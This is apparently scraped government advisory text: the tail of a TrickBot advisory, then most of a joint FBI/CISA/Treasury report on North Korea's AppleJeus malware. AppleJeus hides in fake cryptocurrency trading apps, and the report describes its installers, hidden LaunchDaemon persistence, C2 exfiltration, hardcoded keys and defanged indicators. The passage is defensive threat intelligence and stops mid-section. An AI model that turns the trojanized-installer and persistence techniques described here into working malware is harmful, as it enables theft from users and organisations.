Visit the MITRE ATT&CK Techniques pages (linked in table 1 above) for additional mitigation and detection strategies.
See CISA’s Alert on Technical Approaches to Uncovering and Remediating Malicious Activity for more information on addressing potential incidents and applying best practice incident response procedures.

For additional information on malware incident prevention and handling, see the National Institute of Standards and Technology Special Publication 800-83, Guide to Malware Incident Prevention and Handling for Desktops and Laptops.
Resources

CISA Fact Sheet: TrickBot Malware
MS-ISAC White Paper: Security Primer – TrickBot
United Kingdom National Cyber Security Centre Advisory: Ryuk Ransomware Targeting Organisations Globally
CISA and MS-ISAC Joint Alert AA20-280A: Emotet Malware
MITRE ATT&CK for Enterprise


References,1, FireEye Blog - A Nasty Trick: From Credential Theft Malware to Business Disruption,2, Eclypsium Blog - TrickBot Now Offers 'TrickBoot': Persist, Brick, Profit

Revisions

March 17, 2021: Initial Version|March 24, 2021: Added MITRE ATT&CK Technique  used for reconnaissance|May 20, 2021: Added new MITRE ATT&CKs and updated Table 1






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-076a
67,"




Summary

This Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
This joint advisory is the result of analytic efforts among the Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Treasury (Treasury) to highlight the cyber threat to cryptocurrency posed by North Korea, formally known as the Democratic People’s Republic of Korea (DPRK), and provide mitigation recommendations. Working with U.S. government partners, FBI, CISA, and Treasury assess that Lazarus Group—which these agencies attribute to North Korean state-sponsored advanced persistent threat (APT) actors—is targeting individuals and companies, including cryptocurrency exchanges and financial service companies, through the dissemination of cryptocurrency trading applications that have been modified to include malware that facilitates theft of cryptocurrency.
These cyber actors have targeted organizations for cryptocurrency theft in over 30 countries during the past year alone. It is likely that these actors view modified cryptocurrency trading applications as a means to circumvent international sanctions on North Korea—the applications enable them to gain entry into companies that conduct cryptocurrency transactions and steal cryptocurrency from victim accounts. As highlighted in FASTCash 2.0: North Korea's BeagleBoyz Robbing Banks and Guidance on the North Korean Cyber Threat, North Korea’s state-sponsored cyber actors are targeting cryptocurrency exchanges and accounts to steal and launder hundreds of millions of dollars in cryptocurrency.[1][2][3] The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit https://www.us-cert.cisa.gov/northkorea.
The U.S. Government has identified malware and indicators of compromise (IOCs) used by the North Korean government to facilitate cryptocurrency thefts; the cybersecurity community refers to this activity as “AppleJeus.” This report catalogues AppleJeus malware in detail. North Korea has used AppleJeus malware posing as cryptocurrency trading platforms since at least 2018. In most instances, the malicious application—seen on both Windows and Mac operating systems—appears to be from a legitimate cryptocurrency trading company, thus fooling individuals into downloading it as a third-party application from a website that seems legitimate. In addition to infecting victims through legitimate-looking websites, HIDDEN COBRA actors also use phishing, social networking, and social engineering techniques to lure users into downloading the malware.
Refer to the following Malware Analysis Reports (MARs) for full technical details of AppleJeus malware and associated IOCs.

MAR-10322463-1.v1: AppleJeus – Celas Trade Pro
MAR-10322463-2.v1: AppleJeus – JMT Trading
MAR-10322463-3.v1: AppleJeus – Union Crypto
MAR-10322463-4.v1: AppleJeus – Kupay Wallet
MAR-10322463-5.v1: AppleJeus – CoinGoTrade
MAR-10322463-6.v1: AppleJeus – Dorusio
MAR-10322463-7.v1: AppleJeus – Ants2Whale

Click here for a PDF version of this report.

Technical Details

The North Korean government has used multiple versions of AppleJeus since the malware was initially discovered in 2018. This section outlines seven of the versions below. The MARs listed above provide further technical details of these versions. Initially, HIDDEN COBRA actors used websites that appeared to host legitimate cryptocurrency trading platforms to infect victims with AppleJeus; however, these actors are now also using other initial infection vectors, such as phishing, social networking, and social engineering techniques, to get users to download the malware.
Targeted Nations
HIDDEN COBRA actors have targeted institutions with AppleJeus malware in several sectors, including energy, finance, government, industry, technology, and telecommunications. Since January 2020, the threat actors have targeted these sectors in the following countries: Argentina, Australia, Belgium, Brazil, Canada, China, Denmark, Estonia, Germany, Hong Kong, Hungary, India, Ireland, Israel, Italy, Japan, Luxembourg, Malta, the Netherlands, New Zealand, Poland, Russia, Saudi Arabia, Singapore, Slovenia, South Korea, Spain, Sweden, Turkey, the United Kingdom, Ukraine, and the United States (figure 1).
 

 
Figure 1: Countries targeted with AppleJeus by HIDDEN COBRA threat actors since 2020
AppleJeus Versions Note
The version numbers used for headings in this document correspond to the order the AppleJeus campaigns were identified in open source or through other investigative means. These versions may or may not be in the correct order to develop or deploy the AppleJeus campaigns.
AppleJeus Version 1: Celas Trade Pro
Introduction and Infrastructure
In August 2018, open-source reporting disclosed information about a trojanized version of a legitimate cryptocurrency trading application on an undisclosed victim’s computer. The malicious program, known as Celas Trade Pro, was a modified version of the benign Q.T. Bitcoin Trader application. This incident led to the victim company being infected with a Remote Administration Tool (RAT) known as FALLCHILL, which was attributed to North Korea (HIDDEN COBRA) by the U.S. Government. FALLCHILL is a fully functional RAT with multiple commands that the adversary can issue from a command and control (C2) server to infected systems via various proxies. FALLCHILL typically infects a system as a file dropped by other HIDDEN COBRA malware (Develop Capabilities: Malware [T1587.001]). Because of this, additional HIDDEN COBRA malware may be present on systems compromised with FALLCHILL.[4]
Further research revealed that a phishing email from a Celas LLC company (Phishing: Spearphishing Link [T1566.002]) recommended the trojanized cryptocurrency trading application to victims. The email provided a link to the Celas’ website, celasllc[.]com (Acquire Infrastructure: Domain [T1583.001]), where the victim could download a Windows or macOS version of the trojanized application.
The celasllc[.]com domain resolved to the following Internet Protocol (IP) addresses from May 29, 2018, to January 23, 2021.

45.199.63[.]220
107.187.66[.]103
145.249.106[.]19
175.29.32[.]160
185.142.236[.]213
185.181.104[.]82
198.251.83[.]27
208.91.197[.]46
209.99.64[.]18

The celasllc[.]com domain had a valid Sectigo (previously known as Comodo) Secure Sockets Layer (SSL) certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.
Celas Trade Pro Application Analysis
Windows Program
The Windows version of the malicious Celas Trade Pro application is an MSI Installer (.msi). The MSI Installer installation package comprises a software component and an application programming interface (API) that Microsoft uses for the installation, maintenance, and removal of software. The installer looks legitimate and is signed by a valid Sectigo certificate that was purchased by the same user as the SSL certificate for celasllc[.]com (Obtain Capabilities: Code Signing Certificates [T1588.003]). The MSI Installer asks the victim for administrative privileges to run (User Execution: Malicious File [T1204.002]).
Once permission is granted, the threat actor is able to run the program with elevated privileges (Abuse Elevation Control Mechanism [T1548]) and MSI executes the following actions.

Installs CelasTradePro.exe in folder C:\Program Files (x86)\CelasTradePro
Installs Updater.exe in folder C:\Program Files (x86)\CelasTradePro
Runs Updater.exe with the CheckUpdate parameters

The CelasTradePro.exe program asks for the user’s exchange and loads a legitimate-looking cryptocurrency trading platform—very similar to the benign Q.T. Bitcoin Trader—that exhibits no signs of malicious activity.
The Updater.exe program has the same program icon as CelasTradePro.exe. When run, it checks for the CheckUpdate parameter, collects the victim’s host information (System Owner/User Discovery [T1033]), encrypts the collected information with a hardcoded XOR encryption, and sends information to a C2 website (Exfiltration Over C2 Channel [T1041]).
macOS X Program
The macOS version of the malicious application is a DMG Installer that has a disk image format that Apple commonly uses to distribute software over the internet. The installer looks legitimate and has a valid digital signature from Sectigo (Obtain Capabilities: Digital Certificates [T1588.004]). It has very similar functionality to the Windows version. The installer executes the following actions.

Installs CelasTradePro in folder /Applications/CelasTradePro.app/Contents/MacOS/
Installs Updater in folder /Applications/CelasTradePro.app/Contents/MacOS
Executes a postinstall script

Moves .com.celastradepro.plist to folder LaunchDaemons
Runs Updater with the CheckUpdate parameter



CelasTradePro asks for the user’s exchange and loads a legitimate-looking cryptocurrency trading platform—very similar to the benign Q.T. Bitcoin Trader—that exhibits no signs of malicious activity.
Updater checks for the CheckUpdate parameter and, when found, it collects the victim’s host information (System Owner/User Discovery [T1033]), encrypts the collected information with a hardcoded XOR key before exfiltration, and sends the encrypted information to a C2 website (Exfiltration Over C2 Channel [T1041]). This process helps the adversary obtain persistence on a victim’s network.
The postinstall script is a sequence of instructions that runs after successfully installing an application (Command and Scripting Interpreter: Unix Shell [T1059.004]). This script moves property list (plist) file .com.celastradepro.plist from the installer package to the LaunchDaemons folder (Scheduled Task/Job: Launchd [T1053.004]). The leading “.” makes it unlisted in the Finder app or default Terminal directory listing (Hide Artifacts: Hidden Files and Directories [T1564.001]). Once in the folder, this property list (plist) file will launch the Updater program with the CheckUpdate parameter on system load as Root for every user. Because the LaunchDaemon will not run automatically after the plist file is moved, the postinstall script launches the Updater program with the CheckUpdate parameter and runs it in the background (Create or Modify System Process: Launch Daemon [T1543.004]).
Payload
After a cybersecurity company published a report detailing the above programs and their malicious extras, the website was no longer accessible. Since this site was the C2 server, the payload cannot be confirmed. The cybersecurity company that published the report states the payload was an encrypted and obfuscated binary (Obfuscated Files or Information [T1027]), which eventually drops FALLCHILL onto the machine and installs it as a service (Create or Modify System Process: Windows Service [T1543.003]). FALLCHILL malware uses an RC4 encryption algorithm with a 16-byte key to protect its communications (Encrypted Channel: Symmetric Cryptography [T1573.001]). The key employed in these versions has also been used in a previous version of FALLCHILL.[5][6]
For more details on AppleJeus Version 1: Celas Trade Pro, see MAR-10322463-1.v1.
AppleJeus Version 2: JMT Trading
Introduction and Infrastructure
In October 2019, a cybersecurity company identified a new version of the AppleJeus malware—JMT Trading—thanks to its many similarities to the original AppleJeus malware. Again, the malware was in the form of a cryptocurrency trading application, which a legitimate-looking company, called JMT Trading, marketed and distributed on their website, jmttrading[.]org (Acquire Infrastructure: Domain [T1583.001]). This website contained a “Download from GitHub” button, which linked to JMT Trading’s GitHub page (Acquire Infrastructure: Web Services [T1583.006]), where Windows and macOS X versions of the JMT Trader application were available for download (Develop Capabilities: Malware [T1587.001]). The GitHub page also included .zip and tar.gz files containing the source code.
The jmttrading[.]org domain resolved to the following IP addresses from October 15, 2016, to January 22, 2021.

45.33.2[.]79
45.33.23[.]183
45.56.79[.]23
45.79.19[.]196
96.126.123[.]244
146.112.61[.]107
184.168.221[.]40
184.168.221[.]57
198.187.29[.]20
198.54.117[.]197
198.54.117[.]198
198.54.117[.]199
198.54.117[.]200
198.58.118[.]167

The jmttrading[.]org domain had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence. The current SSL certificate was issued by Let’s Encrypt.
JMT Trading Application Analysis
Windows Program
The Windows version of the malicious cryptocurrency application is an MSI Installer. The installer looks legitimate and has a valid digital signature from Sectigo (Obtain Capabilities: Digital Certificates [T1588.004]). The signature was signed with a code signing certificate purchased by the same user as the SSL certificate for jmttrading[.]org (Obtain Capabilities: Code Signing Certificates [T1588.003]). The MSI Installer asks the victim for administrative privileges to run (User Execution: Malicious File [T1204.002]).
Once permission is granted, the MSI executes the following actions.

Installs JMTTrader.exe in folder C:\Program Files (x86)\JMTTrader
Installs CrashReporter.exe in folder C:\Users\<username>\AppData\Roaming\JMTTrader
Runs CrashReporter.exe with the Maintain parameter

The JMTTrader.exe program asks for the user’s exchange and loads a legitimate-looking cryptocurrency trading platform—very similar to CelasTradePro.exe and the benign Q.T. Bitcoin Trader—that exhibits no signs of malicious activity.
The program CrashReporter.exe is heavily obfuscated with the ADVObfuscation library, renamed “snowman” (Obfuscated Files or Information [T1027]). When run, it checks for the Maintain parameter and collects the victim’s host information (System Owner/User Discovery [T1033]), encrypts the collected information with a hardcoded XOR key before exfiltration, and sends the encrypted information to a C2 website (Exfiltration Over C2 Channel [T1041]). The program also creates a scheduled SYSTEM task, named JMTCrashReporter, which runs CrashReporter.exe with the Maintain parameter at any user’s login (Scheduled Task/Job: Scheduled Task [T1053.005]).
macOS X Program
The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.

Installs JMTTrader in folder /Applications/JMTTrader.app/Contents/MacOS/
Installs .CrashReporter in folder /Applications/JMTTrader.app/Contents/Resources/

Note: the leading “.” makes it unlisted in the Finder app or default Terminal directory listing.


Executes a postinstall script

Moves .com.jmttrading.plist to folder LaunchDaemons
Changes the file permissions on the plist
Runs CrashReporter with the Maintain parameter
Moves .CrashReporter to folder /Library/JMTTrader/CrashReporter
Makes .CrashReporter executable



The JMTTrader program asks for the user’s exchange and loads a legitimate-looking cryptocurrency trading platform—very similar to CelasTradePro and the benign Q.T. Bitcoin Trader—that exhibits no signs of malicious activity.
The CrashReporter program checks for the Maintain parameter and is not obfuscated. This lack of obfuscation makes it easier to determine the program’s functionality in detail. When it finds the Maintain parameter, it collects the victim’s host information (System Owner/User Discovery [T1033]), encrypts the collected information with a hardcoded XOR key before exfiltration, and sends the encrypted information to a C2 website (Exfiltration Over C2 Channel [T1041]).
The postinstall script has similar functionality to the one used by CelasTradePro, but it has a few additional features (Command and Scripting Interpreter: Unix Shell [T1059.004]). It moves the property list (plist) file .com.jmttrading.plist from the Installer package to the LaunchDaemons folder (Scheduled Task/Job: Launchd [T1053.004]), but also changes the file permissions on the plist file. Once in the folder, this property list (plist) file will launch the CrashReporter program with the Maintain parameter on system load as Root for every user. Also, the postinstall script moves the .CrashReporter program to a new location /Library/JMTTrader/CrashReporter and makes it executable. Because the LaunchDaemon will not run automatically after the plist file is moved, the postinstall script launches CrashReporter with the Maintain parameter and runs it in the background (Create or Modify System Process: Launch Daemon [T1543.004]).
Payload
Soon after the cybersecurity company tweeted about JMT Trader on October 11, 2019, the files on GitHub were updated to clean, non-malicious installers. Then on October 13, 2019, a different cybersecurity company published an article detailing the macOS X JMT Trader, and soon after, the C2 beastgoc[.]com website went offline. There is not a confirmed sample of the payload to analyze at this point.
For more details on AppleJeus Version 2: JMT Trading, see MAR-10322463-2.v1.
AppleJeus Version 3: Union Crypto
Introduction and Infrastructure
In December 2019, another version of the AppleJeus malware was identified on Twitter by a cybersecurity company based on many similarities to the original AppleJeus malware. Again, the malware was in the form of a cryptocurrency trading application, which was marketed and distributed by a legitimate-looking company, called Union Crypto, on their website, unioncrypto[.]vip (Acquire Infrastructure: Domain [T1583.001]). Although this website is no longer available, a cybersecurity researcher discovered a download link, https://www.unioncrypto[.]vip/download/W6c2dq8By7luMhCmya2v97YeN, recorded on VirusTotal for the macOS X version of UnionCryptoTrader. In contrast, open-source reporting stated that the Windows version might have been downloaded via instant messaging service Telegram, as it was found in a “Telegram Downloads” folder on an unnamed victim.[7]
The unioncrypto[.]vip domain resolved to the following IP addresses from June 5, 2019, to July 15, 2020.

104.168.167[.]16
198.54.117[.]197
198.54.117[.]198
198.54.117[.]199
198.54.117[.]200

The domain unioncrypto[.]vip had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.
Union Crypto Trader Application Analysis
Windows Program
The Windows version of the malicious cryptocurrency application is a Windows executable (.exe) (User Execution: Malicious File [T1204.002]), which acts as an installer that extracts a temporary MSI Installer.
The Windows program executes the following actions.

Extracts UnionCryptoTrader.msi to folder C:\Users\<username>\AppData\Local\Temp\{82E4B719-90F74BD1-9CF1-56CD777E0C42}
Runs UnionCryptoUpdater.msi

Installs UnionCryptoTrader.exe in folder C:\Program Files\UnionCryptoTrader
Installs UnionCryptoUpdater.exe in folder C:\Users\<username>\AppData\Local\UnionCryptoTrader


Deletes UnionCryptoUpdater.msi
Runs UnionCryptoUpdater.exe

The program UnionCryptoTrader.exe loads a legitimate-looking cryptocurrency arbitrage application—defined as “the simultaneous buying and selling of securities, currency, or commodities in different markets or in derivative forms to take advantage of differing prices for the same asset”—which exhibits no signs of malicious activity. This application is very similar to another cryptocurrency arbitrage application known as Blackbird Bitcoin Arbitrage.[8]
The program UnionCryptoUpdater.exe first installs itself as a service (Create or Modify System Process: Windows Service [T1543.003]), which will automatically start when any user logs on (Boot or Logon Autostart Execution [T1547]). The service is installed with a description stating it “Automatically installs updates for Union Crypto Trader.” When launched, it collects the victim’s host information (System Owner/User Discovery [T1033]), combines the information in a string that is MD5 hashed and stored in the auth_signature variable before exfiltration, and sends it to a C2 website (Exfiltration Over C2 Channel [T1041]).
macOS X Program
The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.

Installs UnionCryptoTrader in folder /Applications/UnionCryptoTrader.app/Contents/MacOS/
Installs .unioncryptoupdater in folder /Applications/UnionCryptoTrader.app/Contents/Resources/

Note: the leading “.” makes it unlisted in the Finder app or default Terminal directory listing


Executes a postinstall script

Moves .vip.unioncrypto.plist to folder LaunchDaemons
Changes the file permissions on the plist to Root
Runs unioncryptoupdater
Moves .unioncryptoupdater to folder /Library/UnionCrypto/unioncryptoupdater
Makes .unioncryptoupdater executable



The UnionCryptoTrader program loads a legitimate-looking cryptocurrency arbitrage application, which exhibits no signs of malicious activity. The application is very similar to another cryptocurrency arbitrage application known as Blackbird Bitcoin Arbitrage.
The .unioncryptoupdater program is signed ad-hoc, meaning it is not signed with a valid code-signing identity. When launched, it collects the victim’s host information (System Owner/User Discovery [T1033]), combines the information in a string that is MD5 hashed and stored in the auth_signature variable before exfiltration, and sends it to a C2 website (Exfiltration Over C2 Channel [T1041]).
The postinstall script has similar functionality to the one used by JMT Trading (Command and Scripting Interpreter: Unix Shell [T1059.004]). It moves the property list (plist) file .vip.unioncrypto.plist from the Installer package to the LaunchDaemons folder (Scheduled Task/Job: Launchd [T1053.004]), but also changes the file permissions on the plist file to Root. Once in the folder, this property list (plist) file will launch the .unioncryptoupdater on system load as Root for every user. The postinstall script moves the .unioncryptoupdater program to a new location /Library/UnionCrypto/unioncryptoupdater and makes it executable. Because the LaunchDaemon will not run automatically after the plist file is moved, the postinstall script launches .unioncryptoupdater and runs it in the background (Create or Modify System Process: Launch Daemon [T1543.004]).
Payload
The payload for the Windows malware is a Windows Dynamic-Link-Library. UnionCryptoUpdater.exe does not immediately download the stage 2 malware but instead downloads it after a time specified by the C2 server. This delay could be implemented to prevent researchers from directly obtaining the stage 2 malware.
The macOS X malware’s payload could not be downloaded, as the C2 server is no longer accessible. Additionally, none of the open-source reporting for this sample contained copies of the macOS X payload. The macOS X payload is likely similar in functionality to the Windows stage 2 detailed above.
For more details on AppleJeus Version 3: Union Crypto, see MAR-10322463-3.v1.
Commonalities between Celas Trade Pro, JMT Trading, and Union Crypto
Hardcoded Values
In each AppleJeus version, there are hardcoded values used for encryption or to create a signature when combined with the time (table 1).
Table 1: AppleJeus hardcoded values and uses



AppleJeus Version 
Value 
Use 




1: Celas Trade Pro
Moz&Wie;#t/6T!2y
XOR encryption to send data


1: Celas Trade Pro
W29ab@ad%Df324V$Yd
RC4 decryption


2: JMT Trader Windows
X,%`PMk--Jj8s+6=15:20:11
XOR encryption to send data


2: JMT Trader OSX
X,%`PMk--Jj8s+6=\x02
XOR encryption to send data


3: Union Crypto Trader
12GWAPCT1F0I1S14
Combined with time for signature



 
The Union Crypto Trader and Celas LLC (XOR) values are 16 bytes in length. For JMT Trader, the first 16 bytes of the Windows and macOS X values are identical, and the additional bytes are in a time format for the Windows sample. The structure of a 16-byte value combined with the time is also used in Union Crypto Trader to create the auth_signature.
As mentioned, FALLCHILL was reported as the final payload for Celas Trade Pro. All FALLCHILL samples use 16-byte hardcoded RC4 keys for sending data, similar to the 16-byte keys in the AppleJeus samples.
Open-Source Cryptocurrency Applications
All three AppleJeus samples are bundled with modified copies of legitimate cryptocurrency applications and can be used as originally designed to trade cryptocurrency. Both Celas LLC and JMT Trader modified the same cryptocurrency application, Q.T. Bitcoin Trader; Union Crypto Trader modified the Blackbird Bitcoin Arbitrage application.
Postinstall Scripts, Property List Files, and LaunchDaemons
The macOS X samples of all three AppleJeus versions contain postinstall scripts with similar logic. The Celas LLC postinstall script only moves the plist file to a new location and launches Updater with the CheckUpdate parameter in the background. The JMT Trader and Union Crypto Trader also perform these actions and have identical functionality. The additional actions performed by both postinstall scripts are to change the file permissions on the plist, make a new directory in the /Library folder, move CrashReporter or UnionCryptoUpdater to the newly created folder, and make them executable.
The plist files for all three AppleJeus files have identical functionality. They only differ in the files’ names and one default comment that was not removed from the Celas LLC plist. As the logic and functionality of the postinstall scripts and plist files are almost identical, the LaunchDaemons created also function the same.
They will all launch the secondary executable as Root on system load for every user.
AppleJeus Version 4: Kupay Wallet
Introduction and Infrastructure
On March 13, 2020, a new version of the AppleJeus malware was identified. The malware was marketed and distributed by a legitimate-looking company, called Kupay Wallet, on their website kupaywallet[.]com (Acquire Infrastructure: Domain [T1583.001]).
The domain www.kupaywallet[.]com resolved to IP address 104.200.67[.]96 from March 20, 2020, to January 16, 2021. CrownCloud US, LLC controlled the IP address (autonomous system number [ASN] 8100), and is located in New York, NY.
The domain www.kupaywallet[.]com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.
Kupay Wallet Application Analysis
Windows Program
The Windows version of the malicious cryptocurrency application is an MSI Installer. The MSI executes the following actions.

Installs Kupay.exe in folder C:\Program Files (x86)\Kupay
Installs KupayUpgrade.exe in folder C:\Users\<username>\AppData\Roaming\KupaySupport
Runs KupayUpgrade.exe

The program Kupay.exe loads a legitimate-looking cryptocurrency wallet platform, which exhibits no signs of malicious activity and is very similar to an open-source platform known as Copay, distributed by Atlanta-based company BitPay.
The program KupayUpgrade.exe first installs itself as a service (Create or Modify System Process: Windows Service [T1543.003]), which will automatically start when any user logs on (Boot or Logon Autostart Execution [T1547]). The service is installed with a description stating it is an “Automatic Kupay Upgrade.” When launched, it collects the victim’s host information (System Owner/User Discovery [T1033]), combines the information in strings before exfiltration, and sends it to a C2 website (Exfiltration Over C2 Channel [T1041]).
macOS X Program
The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.

Installs Kupay in folder /Applications/Kupay.app/Contents/MacOS/
Installs kupay_upgrade in folder /Applications/Kupay.app/Contents/MacOS/
Executes a postinstall script

Creates KupayDaemon folder in /Library/Application Support folder
Moves kupay_upgrade to the new folder
Moves com.kupay.pkg.wallet.plist to folder /Library/LaunchDaemons/
Runs the command launchctl load to load the plist without a restart
Runs kupay_upgrade in the background



Kupay is likely a copy of an open-source cryptocurrency wallet application, loads a legitimate-looking wallet program (fully functional), and its functionality is identical to the Windows Kupay.exe program.
The kupay_upgrade program calls its function CheckUpdate (which contains most of the logic functionality of the malware) and sends a POST to the C2 server with a connection named “Kupay Wallet 9.0.1 (Check Update Osx)” (Application Layer Protocol: Web Protocols [T1071.001]). If the C2 server returns a file, it is decoded and written to the victim’s folder /private/tmp/kupay_update with permissions set by the command chmod 700 (only the user can read, write, and execute) (Command and Scripting Interpreter [T1059]). Stage 2 is then launched, and the malware, kupay_upgrade, returns to sleeping and checking in with the C2 server at predetermined intervals (Application Layer Protocol: Web Protocols [T1071.001]).
The postinstall script has similar functionality to other AppleJeus scripts (Command and Scripting Interpreter: Unix Shell [T1059.004]). It creates the KupayDaemon folder in /Library/Application Support folder and then moves kupay_upgrade to the new folder. It moves the property list (plist) file com.kupay.pkg.wallet.plist from the Installer package to the /Library/LaunchDaemons/ folder (Scheduled Task/Job: Launchd [T1053.004]). The script runs the command launchctl load to load the plist without a restart (Command and Scripting Interpreter [T1059]). But, since the LaunchDaemon will not run automatically after the plist file is moved, the postinstall script launches kupay_upgrade and runs it in the background (Create or Modify System Process: Launch Daemon [T1543.004]).
Payload
The Windows malware’s payload could not be downloaded since the C2 server is no longer accessible. Additionally, none of the open-source reporting for this sample contained copies of the payload. The Windows payload is likely similar in functionality to the macOS X stage 2 detailed below.
The stage 2 payload for the macOS X malware was decoded and analyzed. The stage 2 malware has a variety of functionalities. Most importantly, it checks in with a C2 and, after connecting to the C2, can send or receive a payload, read and write files, execute commands via the terminal, etc.
For more details on AppleJeus Version 4: Kupay Wallet, see MAR-10322463-4.v1.
AppleJeus Version 5: CoinGoTrade
Introduction and Infrastructure
In early 2020, another version of the AppleJeus malware was identified. This time the malware was marketed and distributed by a legitimate-looking company called CoinGoTrade on their website coingotrade[.]com (Acquire Infrastructure: Domain [T1583.001]).
The domain CoinGoTrade[.]com resolved to IP address 198.54.114[.]175 from February 28, 2020, to January 23, 2021. The IP address is controlled by NameCheap Inc. (ASN 22612) and is located in Atlanta, GA. This IP address is in the same ASN for Dorusio[.]com and Ants2Whale[.]com.
The domain CoinGoTrade[.]com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.
CoinGoTrade Application Analysis
Windows Program
The Windows version of the malicious application is an MSI Installer. The installer appears to be legitimate and will execute the following actions.

Installs CoinGoTrade.exe in folder C:\Program Files (x86)\CoinGoTrade
Installs CoinGoTradeUpdate.exe in folder C:\Users\<username>\AppData\Roaming\CoinGoTradeSupport
Runs CoinGoTradeUpdate.exe

CoinGoTrade.exe loads a legitimate-looking cryptocurrency wallet platform with no signs of malicious activity and is a copy of an open-source cryptocurrency application.
CoinGoTradeUpdate.exe first installs itself as a service (Create or Modify System Process: Windows Service [T1543.003]), which will automatically start when any user logs on (Boot or Logon Autostart Execution [T1547]). The service is installed with a description stating it is an “Automatic CoinGoTrade Upgrade.” When launched, it collects the victim’s host information (System Owner/User Discovery [T1033]), combines the information in strings before exfiltration, and sends it to a C2 website (Exfiltration Over C2 Channel [T1041]).
macOS X Program
The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.

Installs CoinGoTrade in folder /Applications/CoinGoTrade.app/Contents/MacOS/
Installs CoinGoTradeUpgradeDaemon in folder /Applications/CoinGoTrade.app/Contents/MacOS/
Executes a postinstall script

Creates CoinGoTradeService folder in /Library/Application Support folder
Moves CoinGoTradeUpgradeDaemon to the new folder
Moves com.coingotrade.pkg.product.plist to folder /Library/LaunchDaemons/
Runs CoinGoTradeUpgradeDaemon in the background



The CoinGoTrade program is likely a copy of an open-source cryptocurrency wallet application and loads a legitimate-looking, fully functional wallet program).
The CoinGoTradeUpgradeDaemon program calls its function CheckUpdate (which contains most of the logic functionality of the malware) and sends a POST to the C2 server with a connection named “CoinGoTrade 1.0 (Check Update Osx)” (Application Layer Protocol: Web Protocols [T1071.001]). If the C2 server returns a file, it is decoded and written to the victim’s folder /private/tmp/updatecoingotrade with permissions set by the command chmod 700 (only the user can read, write, and execute) (Command and Scripting Interpreter [T1059]). Stage 2 is then launched, and the malware, CoinGoTradeUpgradeDaemon, returns to sleeping and checking in with the C2 server at predetermined intervals (Application Layer Protocol: Web Protocols [T1071.001]).
The postinstall script has similar functionality to the other scripts (Command and Scripting Interpreter: Unix Shell [T1059.004]) and installs CoinGoTrade and CoinGoTradeUpgradeDaemon in folder /Applications/CoinGoTrade.app/Contents/MacOS/. It moves the property list (plist) file com.coingotrade.pkg.product.plist to the /Library/LaunchDaemons/ folder (Scheduled Task/Job: Launchd [T1053.004]). Because the LaunchDaemon will not run automatically after the plist file is moved, the postinstall script launches CoinGoTradeUpgradeDaemon and runs it in the background (Create or Modify System Process: Launch Daemon [T1543.004]).
Payload
The Windows malware’s payload could not be downloaded because the C2 server is no longer accessible. Additionally, none of the open-source reporting for this sample contained copies of the payload. The Windows payload is likely similar in functionality to the macOS X stage 2 detailed below.
The stage 2 payload for the macOS X malware was no longer available from the specified download URL. Still, a file was submitted to VirusTotal by the same user on the same date as the macOS X CoinGoTradeUpgradeDaemon. These clues suggest that the submitted file may be related to the macOS X version of the malware and the downloaded payload.
The file prtspool is a 64-bit Mach-O executable with a large variety of features that have all been confirmed as functionality. The file has three C2 URLs hardcoded into the file and communicates to these with HTTP POST multipart-form data boundary string. Like other HIDDEN COBRA malware, prtspool uses format strings to store data collected about the system and sends it to the C2s.
For more details on AppleJeus Version 5: CoinGoTrade, see MAR-10322463-5.v1.
AppleJeus Version 6: Dorusio
Introduction and Infrastructure
In March 2020, an additional version of the AppleJeus malware was identified. This time the malware was marketed and distributed by a legitimate-looking company called Dorusio on their website, dorusio[.]com (Acquire Infrastructure: Domain [T1583.001]). Researchers collected samples for Windows and macOS X versions of the Dorusio Wallet (Develop Capabilities: Malware [T1587.001]). As of at least early 2020, the actual download links result in 404 errors. The download page has release notes with version revisions claiming to start with version 1.0.0, released on April 15, 2019.
The domain dorusio[.]com resolved to IP address 198.54.115[.]51 from March 30, 2020 to January 23, 2021. The IP address is controlled by NameCheap Inc. (ASN 22612) and is located in Atlanta, GA. This IP address is in the same ASN for CoinGoTrade[.]com and Ants2Whale[.]com.
The domain dorusio[.]com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.
Dorusio Application Analysis
Windows Program
The Windows version of the malicious application is an MSI Installer. The installer appears to be legitimate and will install the following two programs.

Installs Dorusio.exe in folder C:\Program Files (x86)\Dorusio
Installs DorusioUpgrade.exe in folder C:\Users\<username>\AppData\Roaming\DorusioSupport
Runs DorusioUpgrade.exe

The program, Dorusio.exe, loads a legitimate-looking cryptocurrency wallet platform with no signs of malicious activity and is a copy of an open-source cryptocurrency application.
